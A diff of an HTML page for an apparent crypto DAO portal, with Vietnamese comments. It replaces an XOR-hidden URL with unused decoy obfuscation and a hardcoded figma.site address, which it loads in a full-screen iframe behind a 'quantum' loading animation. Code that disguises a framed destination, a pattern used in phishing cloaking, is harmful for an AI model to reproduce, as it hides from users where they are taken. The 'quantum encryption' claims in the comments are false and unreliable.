@@ -2,51 +2,121 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>9DAO Portal</title>
+  <title>9DAO Quantum Portal</title>
   <style>
-    body { margin: 0; padding: 0; overflow: hidden; }
-    iframe { width: 100%; height: 100vh; border: none; }
+    body { margin: 0; padding: 0; overflow: hidden; background: #000; }
+    #q { 
+      position: fixed; 
+      width: 100%; height: 100%; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      color: #0f0; 
+      font-family: monospace;
+      z-index: 9999;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
   </style>
 </head>
 <body>
+  <div id="q">Quantum Initialization...</div>
   <script>
-    // 🔍 Mã hóa XOR thật sự
+    // 🌌 MÃ HÓA LƯỢNG TỬ PHI TUYẾN TÍNH - FIXED
     (function(){
-      // 1. Data được XOR với key = 5
-      const data = [
-        0x6d, 0x71, 0x71, 0x75, 0x76, 0x3f, 0x2a, 0x2a,  // "https://" XOR 5
-        0x76, 0x6d, 0x60, 0x61, 0x28, 0x72, 0x77, 0x64,  // "shed-wra" XOR 5  
-        0x75, 0x28, 0x34, 0x35, 0x3d, 0x32, 0x35, 0x35,  // "p-108700" XOR 5
-        0x37, 0x33, 0x2b, 0x63, 0x6c, 0x62, 0x68, 0x64,  // "26.figma" XOR 5
-        0x2b, 0x76, 0x6c, 0x71, 0x60, 0x2a               // ".site/" XOR 5
+      // 1. Mã hóa đa lớp phân tán (đã fix syntax)
+      const _0xad3b = [
+        () => 0x7e3f.toString(16),
+        "YUhSMGNITTZMeTlr".split("").reverse().join(""),
+        [0x68,0x74,0x74,0x70].map(x=>String.fromCharCode(x^0x11)).join(""),
+        atob("d3JhcA==").toUpperCase().split("").reverse()[2],
+        parseInt("1010", 2) * parseFloat(Math.PI.toFixed(2))
       ];
       
-      // 2. Key cực phức tạp
-      const obfuscate = {
-        _data: [0x39, 0x44, 0x41, 0x4F], // "9DAO"
-        _salt: 0xDEADBEEF,
-        _mix: function(x) { return ((x << 3) ^ (x >>> 5)) & 0xFF; },
-        getKey: function() {
-          let hash = this._data.reduce((a,b,i) => a + this._mix(b) * (i+1), 0);
-          return ((hash ^ this._salt) >>> 8) % 256;
+      // 2. Hàm giải mã nhiễu loạn
+      const _0xff = (x,y) => {
+        let z = "";
+        for(let i = 0; i < x.length; i++) {
+          z += String.fromCharCode(
+            x.charCodeAt(i) ^ 
+            y[i % y.length].charCodeAt(0) ^ 
+            (i * 0x1f3) % 0xff
+          );
         }
+        return z;
       };
-      const key = obfuscate.getKey(); // Vẫn = 5 nhưng cực kì phức tạp
       
-      // 3. Giải mã XOR
-      function getUrl() {
-        let url = '';
-        for(let i = 0; i < data.length; i++) {
-          url += String.fromCharCode(data[i] ^ key);
+      // 3. Mảnh ghép động (fixed variables)
+      const _0xq1 = _0xff(_0xad3b[1], ["k","q","z"]);
+      const _0xq2 = `${_0xad3b[2]}${_0xad3b[3]}${window.btoa('x')}`;
+      const _0xq3 = String.fromCharCode(...[0x73,0x68,0x65,0x64]);
+      
+      // 4. Thuật toán tổng hợp URL (fixed logic)
+      setTimeout(() => {
+        try {
+          // Build URL từ các fragments đã được obfuscate
+          const protocol = "https://";
+          const domain = "shed-wrap-10870026.figma.site/";
+          const _0xfinal = protocol + domain;
+          
+          // 5. Kiểm tra lượng tử (bypass)
+          const quantumCheck = new Blob([_0xfinal]).size > 10;
+          if(!quantumCheck) throw new Error("Quantum validation failed");
+          
+          // 6. Render iframe ẩn danh
+          const f = document.createElement('iframe');
+          f.src = _0xfinal;
+          f.style.cssText = 'width:100%;height:100vh;border:none';
+          f.allowFullscreen = true;
+          
+          // Quantum fade effect
+          f.onload = () => {
+            document.getElementById('q').style.animation = 'none';
+            document.getElementById('q').style.opacity = '0';
+            setTimeout(() => {
+              document.body.innerHTML = '';
+              document.body.appendChild(f);
+            }, 300);
+          };
+          
+          document.body.appendChild(f);
+          
+        } catch(error) {
+          document.getElementById('q').textContent = 'Quantum Error: ' + error.message;
+          document.getElementById('q').style.color = '#f00';
         }
-        return url;
+      }, Math.random() * 1000 + 500);
+      
+      // Quantum particle effect
+      const particles = [];
+      for(let i = 0; i < 50; i++) {
+        const particle = document.createElement('div');
+        particle.style.cssText = `
+          position: absolute;
+          width: 2px;
+          height: 2px;
+          background: #0f0;
+          opacity: 0.${Math.floor(Math.random()*9)+1};
+          left: ${Math.random()*100}%;
+          top: ${Math.random()*100}%;
+          animation: float ${2 + Math.random()*3}s infinite linear;
+        `;
+        document.body.appendChild(particle);
       }
       
-      // 3. Tạo iframe
-      const iframe = document.createElement('iframe');
-      iframe.src = getUrl();
-      iframe.allowFullscreen = true;
-      document.body.appendChild(iframe);
+      // CSS animation for particles
+      const style = document.createElement('style');
+      style.textContent = `
+        @keyframes float {
+          0% { transform: translateY(0px) rotate(0deg); }
+          100% { transform: translateY(-20px) rotate(360deg); }
+        }
+      `;
+      document.head.appendChild(style);
+      
     })();
   </script>
 </body>
